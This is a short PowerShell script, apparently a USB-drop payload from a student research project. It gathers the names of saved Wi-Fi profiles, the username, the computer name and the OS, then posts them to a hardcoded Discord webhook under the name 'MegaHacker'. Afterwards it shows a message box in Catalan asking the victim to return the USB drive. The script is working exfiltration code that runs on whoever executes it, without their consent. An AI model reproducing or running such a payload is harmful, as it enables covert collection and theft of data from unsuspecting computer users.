$nw="**Xarxes wifi:**\r\n";
netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value;
    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
  }
  netsh wlan show profile | Select-String '(?<=Perfil de tots els usuaris\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value;
    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
  }
  netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value;
    $nw =$nw+"      "+ [string]$wlan +" => "+  [string]$env:username +"\r\n";
  }
Invoke-RestMethod -ContentType 'Application/Json' -Uri "https://discordapp.com/api/webhooks/1169912156163153920/O5--I6RugQVwUl00NVZ6LkGh-Ql-S-tSwQNVw6DefPe2Xs0ksCa3iXlmLQcrAU6Sdpl_" -Method Post -Body ('{"username": "MegaHacker - Foto2","avatar_url": "https://cdn.memegenerator.es/imagenes/memes/full/31/50/31505790.jpg","content": "'+$nw+'\r\n**Dades:**\r\n     Computer name: '+ $env:COMPUTERNAME +'\r\n     User name: '+ $env:USERNAME +'\r\n     OS: '+ $env:OS +'"}');
Add-Type -AssemblyName PresentationCore,PresentationFramework;
[System.Windows.Forms.MessageBox]::Show("Hola, aquest missatge és part del treball de recerca de Joan, torna l'usb a consejeria. Gràcies per participar-hi!!!","Trec J04n");
